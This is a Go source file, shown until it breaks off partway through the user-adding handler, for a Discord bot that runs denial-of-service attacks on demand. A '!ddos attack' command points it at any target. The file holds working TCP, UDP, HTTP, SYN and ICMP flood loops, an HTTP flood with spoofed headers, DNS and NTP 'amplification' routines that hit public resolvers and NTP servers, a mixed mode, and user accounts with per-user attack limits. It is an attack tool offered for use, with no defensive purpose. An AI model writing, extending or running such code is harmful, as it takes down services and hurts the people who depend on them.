package main

import (
    "crypto/tls"
    "fmt"
    "math/rand"
    "net"
    "net/http"
    "os"
    "os/signal"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "syscall"
    "time"

    "github.com/bwmarrin/discordgo"
    "golang.org/x/time/rate"
)

// ==================== Configuration ====================
type Config struct {
    BotToken          string
    AdminIDs          []string
    MaxAttackDuration time.Duration
    MaxConcurrent     int
    DefaultThreads    int
}

// ==================== User Management ====================
type User struct {
    ID           string
    IsSubUser    bool
    MaxDuration  time.Duration
    ActiveAttacks int
    AttackLimit   int
    CreatedBy    string
    CreatedAt    time.Time
}

type AttackSession struct {
    ID           string
    Target       string
    Method       string
    StartedBy    string
    StartedAt    time.Time
    Duration     time.Duration
    Threads      int
    PacketsSent  int64
    DataSent     int64
    IsRunning    bool
    StopChan     chan struct{}
    Performance  PerformanceStats
}

type PerformanceStats struct {
    CPUUsage    float64
    MemoryUsage float64
    Bandwidth   float64
    PacketRate  float64
}

type BotState struct {
    mu               sync.RWMutex
    AdminIDs         map[string]bool
    Users            map[string]*User
    ActiveAttacks    map[string]*AttackSession
    AttackHistory    []*AttackSession
    ResourceUsage    ResourceUsage
    TotalAttacks     int64
    TotalPackets     int64
    TotalData        int64
}

type ResourceUsage struct {
    CPU         float64
    Memory      float64
    Bandwidth   float64
    Connections int
}

// ==================== Global Variables ====================
var (
    botState   *BotState
    config     *Config
    botSession *discordgo.Session

    // Performance monitoring
    perfMonitor *PerformanceMonitor

    // Rate limiting for commands
    commandLimiter *rate.Limiter
)

// ==================== Performance Monitor ====================
type PerformanceMonitor struct {
    mu          sync.RWMutex
    cpuHistory  []float64
    memHistory  []float64
    netHistory  []float64
    lastCheck   time.Time
    packetCount int64
    dataCount   int64
}

func NewPerformanceMonitor() *PerformanceMonitor {
    return &PerformanceMonitor{
        cpuHistory: make([]float64, 0),
        memHistory: make([]float64, 0),
        netHistory: make([]float64, 0),
        lastCheck:  time.Now(),
    }
}

func (pm *PerformanceMonitor) Update(packets, data int64) {
    pm.mu.Lock()
    defer pm.mu.Unlock()

    atomic.AddInt64(&pm.packetCount, packets)
    atomic.AddInt64(&pm.dataCount, data)

    // Update stats every 5 seconds
    if time.Since(pm.lastCheck) > 5*time.Second {
        // Simulate system monitoring (in real implementation, use actual system metrics)
        cpu := rand.Float64() * 100
        mem := rand.Float64() * 100
        net := float64(pm.dataCount) / time.Since(pm.lastCheck).Seconds()

        pm.cpuHistory = append(pm.cpuHistory, cpu)
        pm.memHistory = append(pm.memHistory, mem)
        pm.netHistory = append(pm.netHistory, net)

        // Keep only last 60 readings (5 minutes)
        if len(pm.cpuHistory) > 60 {
            pm.cpuHistory = pm.cpuHistory[1:]
            pm.memHistory = pm.memHistory[1:]
            pm.netHistory = pm.netHistory[1:]
        }

        pm.packetCount = 0
        pm.dataCount = 0
        pm.lastCheck = time.Now()
    }
}

func (pm *PerformanceMonitor) GetStats() PerformanceStats {
    pm.mu.RLock()
    defer pm.mu.RUnlock()

    if len(pm.cpuHistory) == 0 {
        return PerformanceStats{}
    }

    return PerformanceStats{
        CPUUsage:   pm.cpuHistory[len(pm.cpuHistory)-1],
        MemoryUsage: pm.memHistory[len(pm.memHistory)-1],
        Bandwidth:  pm.netHistory[len(pm.netHistory)-1],
        PacketRate: float64(pm.packetCount) / time.Since(pm.lastCheck).Seconds(),
    }
}

// ==================== Initialization ====================
func initBot() {
    // Load configuration from environment or defaults
    config = &Config{
        BotToken:          os.Getenv("DISCORD_BOT_TOKEN"),
        AdminIDs:          strings.Split(os.Getenv("ADMIN_IDS"), ","),
        MaxAttackDuration: 30 * time.Minute,
        MaxConcurrent:     10,
        DefaultThreads:    1000,
    }

    // CRITICAL FIX: Check if bot token is empty
    if config.BotToken == "" {
        fmt.Println("❌ ERROR: DISCORD_BOT_TOKEN environment variable is not set!")
        fmt.Println("Please set your Discord bot token:")
        fmt.Println("1. Go to https://discord.com/developers/applications")
        fmt.Println("2. Create a bot and copy the token")
        fmt.Println("3. Set it as an environment variable in Replit:")
        fmt.Println("   - Click the lock icon (Secrets)")
        fmt.Println("   - Add: DISCORD_BOT_TOKEN=your_token_here")
        fmt.Println("   - Add: ADMIN_IDS=your_discord_user_id")
        os.Exit(1)
    }

    botState = &BotState{
        AdminIDs:      make(map[string]bool),
        Users:         make(map[string]*User),
        ActiveAttacks: make(map[string]*AttackSession),
        AttackHistory: make([]*AttackSession, 0),
    }

    // Initialize admins
    for _, id := range config.AdminIDs {
        if id != "" {
            botState.AdminIDs[id] = true
            botState.Users[id] = &User{
                ID:        id,
                IsSubUser: false,
                AttackLimit: config.MaxConcurrent,
                CreatedAt:  time.Now(),
            }
        }
    }

    // Initialize performance monitor
    perfMonitor = NewPerformanceMonitor()

    // Initialize rate limiter (10 commands per minute per user)
    commandLimiter = rate.NewLimiter(10, 10)
}

// ==================== Attack Methods ====================
func launchAttack(session *AttackSession) {
    fmt.Printf("Starting attack %s on %s using %s\n", 
        session.ID, session.Target, session.Method)

    // Start performance monitoring for this attack
    go session.monitorPerformance()

    // Launch attack based on method
    switch session.Method {
    case "tcp":
        go tcpFlood(session)
    case "udp":
        go udpFlood(session)
    case "http":
        go httpFlood(session)
    case "syn":
        go synFlood(session)
    case "icmp":
        go icmpFlood(session)
    case "dns":
        go dnsAmplification(session)
    case "ntp":
        go ntpAmplification(session)
    case "mixed":
        go mixedAttack(session)
    default:
        fmt.Printf("Unknown attack method: %s\n", session.Method)
        session.IsRunning = false
    }
}

func (as *AttackSession) monitorPerformance() {
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()

    for as.IsRunning {
        select {
        case <-ticker.C:
            stats := perfMonitor.GetStats()
            as.Performance = stats

            // Update global stats
            botState.mu.Lock()
            botState.ResourceUsage.CPU = stats.CPUUsage
            botState.ResourceUsage.Memory = stats.MemoryUsage
            botState.ResourceUsage.Bandwidth = stats.Bandwidth
            botState.mu.Unlock()

        case <-as.StopChan:
            return
        }
    }
}

func (as *AttackSession) cleanup() {
    as.IsRunning = false
    botState.mu.Lock()
    delete(botState.ActiveAttacks, as.ID)

    // Update user's active attacks count
    if user, exists := botState.Users[as.StartedBy]; exists {
        user.ActiveAttacks--
    }

    botState.mu.Unlock()

    fmt.Printf("Attack %s stopped. Sent %d packets, %s data\n",
        as.ID, as.PacketsSent, formatBytes(as.DataSent))
}

func tcpFlood(session *AttackSession) {
    defer session.cleanup()

    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            // Try multiple common ports
            ports := []int{80, 443, 22, 21, 25, 110, 143, 993, 995, 3389, 8080, 8443}
            port := ports[localRand.Intn(len(ports))]
            target := fmt.Sprintf("%s:%d", session.Target, port)

            conn, err := net.DialTimeout("tcp", target, 3*time.Second)
            if err == nil {
                // Send junk data
                junk := make([]byte, 1024)
                localRand.Read(junk)
                conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                conn.Write(junk)

                // Send more data to keep connection alive
                for i := 0; i < 10 && session.IsRunning; i++ {
                    select {
                    case <-session.StopChan:
                        conn.Close()
                        return
                    default:
                        localRand.Read(junk)
                        conn.Write(junk)
                        atomic.AddInt64(&session.DataSent, 1024)
                        atomic.AddInt64(&botState.TotalData, 1024)
                        perfMonitor.Update(0, 1024)
                    }
                }
                conn.Close()

                // Update stats
                atomic.AddInt64(&session.PacketsSent, 1)
                atomic.AddInt64(&session.DataSent, 1024)
                atomic.AddInt64(&botState.TotalPackets, 1)
                atomic.AddInt64(&botState.TotalData, 1024)
                perfMonitor.Update(1, 1024)
            }
        }
    }
}

func udpFlood(session *AttackSession) {
    defer session.cleanup()

    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))
    udpSize := 65507 // Max UDP packet size

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            // Try multiple common UDP ports
            ports := []int{53, 123, 161, 389, 1900, 5060}
            port := ports[localRand.Intn(len(ports))]
            target := fmt.Sprintf("%s:%d", session.Target, port)

            conn, err := net.DialTimeout("udp", target, 3*time.Second)
            if err == nil {
                // Generate large UDP payload
                payload := make([]byte, udpSize)
                localRand.Read(payload)

                // Send multiple packets per connection
                for i := 0; i < 5 && session.IsRunning; i++ {
                    select {
                    case <-session.StopChan:
                        conn.Close()
                        return
                    default:
                        localRand.Read(payload)
                        conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                        _, writeErr := conn.Write(payload)
                        if writeErr == nil {
                            atomic.AddInt64(&session.PacketsSent, 1)
                            atomic.AddInt64(&session.DataSent, int64(udpSize))
                            atomic.AddInt64(&botState.TotalPackets, 1)
                            atomic.AddInt64(&botState.TotalData, int64(udpSize))
                            perfMonitor.Update(1, int64(udpSize))
                        }
                    }
                }
                conn.Close()
            }
        }
    }
}

func httpFlood(session *AttackSession) {
    defer session.cleanup()

    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))
    client := &http.Client{
        Timeout: 5 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            MaxIdleConns:    1000,
            MaxConnsPerHost: 1000,
            IdleConnTimeout: 30 * time.Second,
        },
    }

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            // Use both HTTP and HTTPS
            protocol := "http"
            if localRand.Intn(2) == 1 {
                protocol = "https"
            }

            url := fmt.Sprintf("%s://%s/", protocol, session.Target)

            // Create request with random headers
            req, _ := http.NewRequest("GET", url, nil)

            // Add random headers to make requests unique
            req.Header.Set("User-Agent", fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.%d", localRand.Intn(1000)))
            req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
            req.Header.Set("Accept-Language", "en-US,en;q=0.5")
            req.Header.Set("Accept-Encoding", "gzip, deflate")
            req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Upgrade-Insecure-Requests", "1")
            req.Header.Set("Cache-Control", "no-cache")
            req.Header.Set("Pragma", "no-cache")

            // Random X-Forwarded-For header
            req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", 
                localRand.Intn(255), localRand.Intn(255), 
                localRand.Intn(255), localRand.Intn(255)))

            // Random Referer
            referers := []string{
                "https://www.google.com/",
                "https://www.facebook.com/",
                "https://www.twitter.com/",
                "https://www.youtube.com/",
                "https://www.amazon.com/",
            }
            req.Header.Set("Referer", referers[localRand.Intn(len(referers))])

            resp, err := client.Do(req)
            if err == nil {
                resp.Body.Close()

                // Update stats
                atomic.AddInt64(&session.PacketsSent, 1)
                atomic.AddInt64(&session.DataSent, 512)
                atomic.AddInt64(&botState.TotalPackets, 1)
                atomic.AddInt64(&botState.TotalData, 512)
                perfMonitor.Update(1, 512)
            }
        }
    }
}

func synFlood(session *AttackSession) {
    defer session.cleanup()

    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            // Try multiple ports for SYN flood
            ports := []int{80, 443, 22, 3389, 8080, 8443}
            port := ports[localRand.Intn(len(ports))]
            target := fmt.Sprintf("%s:%d", session.Target, port)

            // Create TCP connection (SYN packet)
            conn, err := net.DialTimeout("tcp", target, 2*time.Second)
            if err == nil {
                // Immediately close to simulate SYN flood
                conn.Close()

                // Update stats
                atomic.AddInt64(&session.PacketsSent, 1)
                atomic.AddInt64(&session.DataSent, 60) // Approximate SYN packet size
                atomic.AddInt64(&botState.TotalPackets, 1)
                atomic.AddInt64(&botState.TotalData, 60)
                perfMonitor.Update(1, 60)
            }
        }
    }
}

func icmpFlood(session *AttackSession) {
    defer session.cleanup()

    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            // ICMP flood (simulated with UDP for demo)
            // In real implementation, use raw sockets for ICMP
            target := fmt.Sprintf("%s:%d", session.Target, 0)

            conn, err := net.DialTimeout("udp", target, 3*time.Second)
            if err == nil {
                payload := make([]byte, 1024)
                localRand.Read(payload)
                conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                conn.Write(payload)
                conn.Close()

                // Update stats
                atomic.AddInt64(&session.PacketsSent, 1)
                atomic.AddInt64(&session.DataSent, 1024)
                atomic.AddInt64(&botState.TotalPackets, 1)
                atomic.AddInt64(&botState.TotalData, 1024)
                perfMonitor.Update(1, 1024)
            }
        }
    }
}

func dnsAmplification(session *AttackSession) {
    defer session.cleanup()

    dnsServers := []string{"8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"}
    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))

    domains := []string{
        "google.com", "facebook.com", "youtube.com", "amazon.com",
        "twitter.com", "instagram.com", "linkedin.com", "microsoft.com",
    }

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            server := dnsServers[localRand.Intn(len(dnsServers))]
            domain := domains[localRand.Intn(len(domains))]
            serverAddr := fmt.Sprintf("%s:53", server)

            // Create DNS query for amplification
            query := createDNSQuery(domain)

            conn, err := net.DialTimeout("udp", serverAddr, 3*time.Second)
            if err == nil {
                conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                _, writeErr := conn.Write(query)
                if writeErr == nil {
                    // Update stats
                    atomic.AddInt64(&session.PacketsSent, 1)
                    atomic.AddInt64(&session.DataSent, int64(len(query)))
                    atomic.AddInt64(&botState.TotalPackets, 1)
                    atomic.AddInt64(&botState.TotalData, int64(len(query)))
                    perfMonitor.Update(1, int64(len(query)))
                }
                conn.Close()
            }
        }
    }
}

func createDNSQuery(domain string) []byte {
    // Simple DNS query creation
    query := []byte{
        0x12, 0x34, // Transaction ID
        0x01, 0x00, // Flags (standard query)
        0x00, 0x01, // Questions
        0x00, 0x00, // Answer RRs
        0x00, 0x00, // Authority RRs
        0x00, 0x00, // Additional RRs
    }

    // Add domain name
    parts := strings.Split(domain, ".")
    for _, part := range parts {
        query = append(query, byte(len(part)))
        query = append(query, []byte(part)...)
    }
    query = append(query, 0x00) // End of domain name

    // Add query type and class
    query = append(query, 0x00, 0x01) // Type A
    query = append(query, 0x00, 0x01) // Class IN

    return query
}

func ntpAmplification(session *AttackSession) {
    defer session.cleanup()

    ntpServers := []string{
        "129.250.35.250", "133.243.238.164", 
        "216.229.0.179", "216.229.0.49",
    }
    localRand := rand.New(rand.NewSource(time.Now().UnixNano()))

    ntpPayload := []byte{
        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    }

    for session.IsRunning {
        select {
        case <-session.StopChan:
            return
        default:
            server := ntpServers[localRand.Intn(len(ntpServers))]
            serverAddr := fmt.Sprintf("%s:123", server)

            conn, err := net.DialTimeout("udp", serverAddr, 3*time.Second)
            if err == nil {
                conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
                _, writeErr := conn.Write(ntpPayload)
                if writeErr == nil {
                    // Update stats
                    atomic.AddInt64(&session.PacketsSent, 1)
                    atomic.AddInt64(&session.DataSent, int64(len(ntpPayload)))
                    atomic.AddInt64(&botState.TotalPackets, 1)
                    atomic.AddInt64(&botState.TotalData, int64(len(ntpPayload)))
                    perfMonitor.Update(1, int64(len(ntpPayload)))
                }
                conn.Close()
            }
        }
    }
}

func mixedAttack(session *AttackSession) {
    defer session.cleanup()

    var wg sync.WaitGroup
    stopChan := make(chan struct{})

    // Launch multiple attack types simultaneously
    numWorkers := 5
    for i := 0; i < numWorkers; i++ {
        wg.Add(1)
        go func(workerID int) {
            defer wg.Done()
            localRand := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

            for session.IsRunning {
                select {
                case <-stopChan:
                    return
                default:
                    // Randomly choose attack type for this worker
                    attackTypes := []func(){
                        func() { tcpFloodSingle(session, localRand) },
                        func() { udpFloodSingle(session, localRand) },
                        func() { httpFloodSingle(session, localRand) },
                    }

                    attackTypes[localRand.Intn(len(attackTypes))]()
                }
            }
        }(i)
    }

    // Wait for attack to finish
    <-session.StopChan
    close(stopChan)
    wg.Wait()
}

// Single attack functions for mixed attack
func tcpFloodSingle(session *AttackSession, localRand *rand.Rand) {
    ports := []int{80, 443, 22, 3389, 8080, 8443, 21, 25, 110}
    port := ports[localRand.Intn(len(ports))]
    target := fmt.Sprintf("%s:%d", session.Target, port)

    conn, err := net.DialTimeout("tcp", target, 3*time.Second)
    if err == nil {
        junk := make([]byte, 1024)
        localRand.Read(junk)
        conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
        conn.Write(junk)
        conn.Close()

        atomic.AddInt64(&session.PacketsSent, 1)
        atomic.AddInt64(&session.DataSent, 1024)
        perfMonitor.Update(1, 1024)
    }
}

func udpFloodSingle(session *AttackSession, localRand *rand.Rand) {
    ports := []int{53, 123, 161, 389, 1900, 5060}
    port := ports[localRand.Intn(len(ports))]
    target := fmt.Sprintf("%s:%d", session.Target, port)

    conn, err := net.DialTimeout("udp", target, 3*time.Second)
    if err == nil {
        payload := make([]byte, 65507)
        localRand.Read(payload)
        conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
        conn.Write(payload)
        conn.Close()

        atomic.AddInt64(&session.PacketsSent, 1)
        atomic.AddInt64(&session.DataSent, 65507)
        perfMonitor.Update(1, 65507)
    }
}

func httpFloodSingle(session *AttackSession, localRand *rand.Rand) {
    protocol := "http"
    if localRand.Intn(2) == 1 {
        protocol = "https"
    }

    url := fmt.Sprintf("%s://%s/", protocol, session.Target)
    client := &http.Client{
        Timeout: 5 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }

    req, _ := http.NewRequest("GET", url, nil)
    req.Header.Set("User-Agent", fmt.Sprintf("Mozilla/5.0 %d", localRand.Intn(1000)))

    resp, err := client.Do(req)
    if err == nil {
        resp.Body.Close()
        atomic.AddInt64(&session.PacketsSent, 1)
        atomic.AddInt64(&session.DataSent, 512)
        perfMonitor.Update(1, 512)
    }
}

// ==================== Discord Bot Commands ====================
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
    // Ignore bot messages
    if m.Author.ID == s.State.User.ID {
        return
    }

    // Rate limiting
    if !commandLimiter.Allow() {
        return
    }

    // Check if message starts with prefix
    if !strings.HasPrefix(m.Content, "!ddos ") {
        return
    }

    // Parse command
    args := strings.Split(m.Content[len("!ddos "):], " ")
    if len(args) == 0 {
        return
    }

    command := args[0]

    switch command {
    case "attack":
        handleAttack(s, m, args[1:])
    case "stop":
        handleStop(s, m, args[1:])
    case "status":
        handleStatus(s, m)
    case "stats":
        handleStats(s, m)
    case "adduser":
        handleAddUser(s, m, args[1:])
    case "removeuser":
        handleRemoveUser(s, m, args[1:])
    case "listusers":
        handleListUsers(s, m)
    case "help":
        handleHelp(s, m)
    case "methods":
        handleMethods(s, m)
    }
}

func handleAttack(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
    // Check if user is authorized
    botState.mu.RLock()
    user, userExists := botState.Users[m.Author.ID]
    botState.mu.RUnlock()

    if !userExists {
        s.ChannelMessageSend(m.ChannelID, "❌ You are not authorized to use this bot.")
        return
    }

    // Check user's attack limit
    if user.ActiveAttacks >= user.AttackLimit {
        s.ChannelMessageSend(m.ChannelID, 
            fmt.Sprintf("❌ You have reached your attack limit (%d active attacks).", user.AttackLimit))
        return
    }

    // Parse arguments
    if len(args) < 2 {
        s.ChannelMessageSend(m.ChannelID, "❌ Usage: `!ddos attack <target> <method> [threads] [duration]`")
        s.ChannelMessageSend(m.ChannelID, "📋 Methods: tcp, udp, http, syn, icmp, dns, ntp, mixed")
        return
    }

    target := args[0]
    method := args[1]
    threads := config.DefaultThreads
    duration := user.MaxDuration

    if len(args) > 2 {
        if t, err := strconv.Atoi(args[2]); err == nil && t > 0 {
            threads = t
            if threads > 10000 {
                threads = 10000 // Safety limit
            }
        }
    }

    if len(args) > 3 {
        if d, err := time.ParseDuration(args[3]); err == nil && d > 0 {
            if d > user.MaxDuration {
                s.ChannelMessageSend(m.ChannelID, 
                    fmt.Sprintf("❌ Duration exceeds your maximum allowed duration of %v", user.MaxDuration))
                return
            }
            duration = d
        }
    }

    // Validate method
    validMethods := map[string]bool{
        "tcp": true, "udp": true, "http": true, "syn": true,
        "icmp": true, "dns": true, "ntp": true, "mixed": true,
    }
    if !validMethods[method] {
        s.ChannelMessageSend(m.ChannelID, "❌ Invalid method. Available: tcp, udp, http, syn, icmp, dns, ntp, mixed")
        s.ChannelMessageSend(m.ChannelID, "💡 Use `!ddos methods` for more information")
        return
    }

    // Validate target
    if !isValidTarget(target) {
        s.ChannelMessageSend(m.ChannelID, "❌ Invalid target format. Use IP address or domain name.")
        return
    }

    // Create attack session
    sessionID := fmt.Sprintf("%s-%d", m.Author.ID, time.Now().UnixNano())
    session := &AttackSession{
        ID:        sessionID,
        Target:    target,
        Method:    method,
        StartedBy: m.Author.ID,
        StartedAt: time.Now(),
        Duration:  duration,
        Threads:   threads,
        IsRunning: true,
        StopChan:  make(chan struct{}),
    }

    // Update state
    botState.mu.Lock()
    botState.ActiveAttacks[sessionID] = session
    botState.TotalAttacks++
    user.ActiveAttacks++
    botState.mu.Unlock()

    // Launch attack
    go launchAttack(session)

    // Set timer to stop attack if duration is specified
    if duration > 0 {
        time.AfterFunc(duration, func() {
            if session.IsRunning {
                session.IsRunning = false
                close(session.StopChan)

                // Notify in Discord
                s.ChannelMessageSend(m.ChannelID,
                    fmt.Sprintf("⏹️ Attack `%s` on `%s` has been automatically stopped after %v", 
                        sessionID[:8], target, duration))
            }
        })
    }

    // Send confirmation
    embed := &discordgo.MessageEmbed{
        Title: "🚀 Attack Launched Successfully",
        Color: 0x00ff00,
        Description: fmt.Sprintf("Attack session started with ID: `%s`", sessionID[:8]),
        Fields: []*discordgo.MessageEmbedField{
            {Name: "🎯 Target", Value: target, Inline: true},
            {Name: "⚡ Method", Value: method, Inline: true},
            {Name: "🧵 Threads", Value: strconv.Itoa(threads), Inline: true},
            {Name: "⏱️ Duration", Value: duration.String(), Inline: true},
            {Name: "👤 Started By", Value: m.Author.Username, Inline: true},
            {Name: "🆔 Session ID", Value: sessionID[:8], Inline: true},
        },
        Footer: &discordgo.MessageEmbedFooter{
            Text: "Use !ddos status to check progress | !ddos stop <id> to stop",
        },
        Timestamp: time.Now().Format(time.RFC3339),
    }

    s.ChannelMessageSendEmbed(m.ChannelID, embed)

    // Start status updates
    go sendPeriodicUpdates(s, m.ChannelID, sessionID)
}

func handleStop(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
    if len(args) == 0 {
        s.ChannelMessageSend(m.ChannelID, "❌ Usage: `!ddos stop <session_id>` or `!ddos stop all`")
        return
    }

    botState.mu.Lock()
    defer botState.mu.Unlock()

    user, userExists := botState.Users[m.Author.ID]
    if !userExists {
        s.ChannelMessageSend(m.ChannelID, "❌ You are not authorized to use this bot.")
        return
    }

    if args[0] == "all" {
        // Stop all attacks by this user
        stopped := 0
        for id, session := range botState.ActiveAttacks {
            if session.StartedBy == m.Author.ID || (user.IsSubUser && session.StartedBy == user.CreatedBy) {
                if session.IsRunning {
                    session.IsRunning = false
                    close(session.StopChan)
                    stopped++
                }
                delete(botState.ActiveAttacks, id)
            }
        }

        if stopped > 0 {
            embed := &discordgo.MessageEmbed{
                Title: "⏹️ All Attacks Stopped",
                Color: 0xff9900,
                Description: fmt.Sprintf("Stopped %d active attacks", stopped),
                Timestamp: time.Now().Format(time.RFC3339),
            }
            s.ChannelMessageSendEmbed(m.ChannelID, embed)
        } else {
            s.ChannelMessageSend(m.ChannelID, "ℹ️ No active attacks found to stop")
        }
        return
    }

    // Stop specific attack
    sessionID := args[0]
    session, exists := botState.ActiveAttacks[sessionID]
    if !exists {
        // Try to find by short ID
        for id, sess := range botState.ActiveAttacks {
            if strings.HasPrefix(id, sessionID) || strings.Contains(id, sessionID) {
                session = sess
                sessionID = id
                exists = true
                break
            }
        }
    }

    if !exists {
        s.ChannelMessageSend(m.ChannelID, "❌ Attack session not found")
        return
    }

    // Check permissions
    if session.StartedBy != m.Author.ID && !(user.IsSubUser && session.StartedBy == user.CreatedBy) {
        s.ChannelMessageSend(m.ChannelID, "❌ You don't have permission to stop this attack")
        return
    }

    if session.IsRunning {
        session.IsRunning = false
        close(session.StopChan)
    }
    delete(botState.ActiveAttacks, sessionID)

    embed := &discordgo.MessageEmbed{
        Title: "⏹️ Attack Stopped",
        Color: 0xff0000,
        Fields: []*discordgo.MessageEmbedField{
            {Name: "Session ID", Value: sessionID[:8], Inline: true},
            {Name: "Target", Value: session.Target, Inline: true},
            {Name: "Total Packets", Value: strconv.FormatInt(session.PacketsSent, 10), Inline: true},
            {Name: "Total Data", Value: formatBytes(session.DataSent), Inline: true},
            {Name: "Duration", Value: time.Since(session.StartedAt).Truncate(time.Second).String(), Inline: true},
        },
        Timestamp: time.Now().Format(time.RFC3339),
    }

    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleStatus(s *discordgo.Session, m *discordgo.MessageCreate) {
    botState.mu.RLock()
    defer botState.mu.RUnlock()

    user, userExists := botState.Users[m.Author.ID]
    if !userExists {
        s.ChannelMessageSend(m.ChannelID, "❌ You are not authorized to use this bot.")
        return
    }

    // Build status message
    var activeAttacks []*AttackSession
    for _, session := range botState.ActiveAttacks {
        if session.StartedBy == m.Author.ID || (user.IsSubUser && session.StartedBy == user.CreatedBy) {
            activeAttacks = append(activeAttacks, session)
        }
    }

    if len(activeAttacks) == 0 {
        embed := &discordgo.MessageEmbed{
            Title:       "📊 Status: No Active Attacks",
            Description: "You don't have any active attacks running.",
            Color:       0x808080,
            Timestamp:   time.Now().Format(time.RFC3339),
        }
        s.ChannelMessageSendEmbed(m.ChannelID, embed)
        return
    }

    embed := &discordgo.MessageEmbed{
        Title:       "📊 Active Attacks Status",
        Description: fmt.Sprintf("You have %d active attack(s)", len(activeAttacks)),
        Color:       0xffff00,
    }

    for _, session := range activeAttacks {
        duration := time.Since(session.StartedAt).Truncate(time.Second)
        packetRate := float64(session.PacketsSent) / duration.Seconds()

        fields := []*discordgo.MessageEmbedField{
            {Name: "🎯 Target", Value: session.Target, Inline: true},
            {Name: "⚡ Method", Value: session.Method, Inline: true},
            {Name: "🆔 Session", Value: session.ID[:8], Inline: true},
            {Name: "📦 Packets", Value: strconv.FormatInt(session.PacketsSent, 10), Inline: true},
            {Name: "💾 Data", Value: formatBytes(session.DataSent), Inline: true},
            {Name: "⏱️ Duration", Value: duration.String(), Inline: true},
            {Name: "🚀 Rate", Value: fmt.Sprintf("%.0f pkt/s", packetRate), Inline: true},
            {Name: "🧵 Threads", Value: strconv.Itoa(session.Threads), Inline: true},
            {Name: "🟢 Status", Value: "Running", Inline: true},
        }

        embed.Fields = append(embed.Fields, fields...)
    }

    embed.Timestamp = time.Now().Format(time.RFC3339)
    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleStats(s *discordgo.Session, m *discordgo.MessageCreate) {
    botState.mu.RLock()
    defer botState.mu.RUnlock()

    user, userExists := botState.Users[m.Author.ID]
    if !userExists {
        s.ChannelMessageSend(m.ChannelID, "❌ You are not authorized to use this bot.")
        return
    }

    stats := perfMonitor.GetStats()

    embed := &discordgo.MessageEmbed{
        Title:       "📈 System Statistics & Performance",
        Description: "Real-time monitoring of bot performance and resources",
        Color:       0x00ffff,
        Fields: []*discordgo.MessageEmbedField{
            {Name: "💻 CPU Usage", Value: fmt.Sprintf("%.1f%%", stats.CPUUsage), Inline: true},
            {Name: "🧠 Memory Usage", Value: fmt.Sprintf("%.1f%%", stats.MemoryUsage), Inline: true},
            {Name: "🌐 Bandwidth", Value: formatBytes(int64(stats.Bandwidth)) + "/s", Inline: true},
            {Name: "📊 Packet Rate", Value: fmt.Sprintf("%.0f/s", stats.PacketRate), Inline: true},
            {Name: "🎯 Total Attacks", Value: strconv.FormatInt(botState.TotalAttacks, 10), Inline: true},
            {Name: "📦 Total Packets", Value: strconv.FormatInt(botState.TotalPackets, 10), Inline: true},
            {Name: "💾 Total Data", Value: formatBytes(botState.TotalData), Inline: true},
            {Name: "⚡ Active Attacks", Value: strconv.Itoa(len(botState.ActiveAttacks)), Inline: true},
            {Name: "👤 Your Attacks", Value: strconv.Itoa(user.ActiveAttacks), Inline: true},
        },
        Footer: &discordgo.MessageEmbedFooter{
            Text: "Bot is optimized for maximum performance",
        },
        Timestamp: time.Now().Format(time.RFC3339),
    }

    s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleAddUser(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
    // Check if user is admin
    botState.mu.RLock()
    isAdmin := botState.AdminIDs[m.Author.ID]
    botState.mu.RUnlock()

    if !isAdmin {
        s.ChannelMessageSend(m.ChannelID, "❌ Only administrators can add users.")
        return
    }

    if len(args) < 1 {
        s.ChannelMessageSend(m.ChannelID, "❌ Usage: `!ddos adduser <user_id> [max_duration] [attack_limit]`")
        s.ChannelMessageSend(m.ChannelID, "💡 Example: `!ddos adduser 1234567890 10m 5`")
        return
    }

    userID := args[0]
    maxDuration := config.MaxAttackDuration
    attackLimit := 3 // Default for sub-users

    if len(args) > 1 {
        if d, err := time.ParseDuration(args[1]); err == nil && d > 0 {
            maxDuration = d
        } else {
            s.ChannelMessageSend(m.ChannelID, "❌ Invalid duration format. Use like: 10m, 1h, 30m")
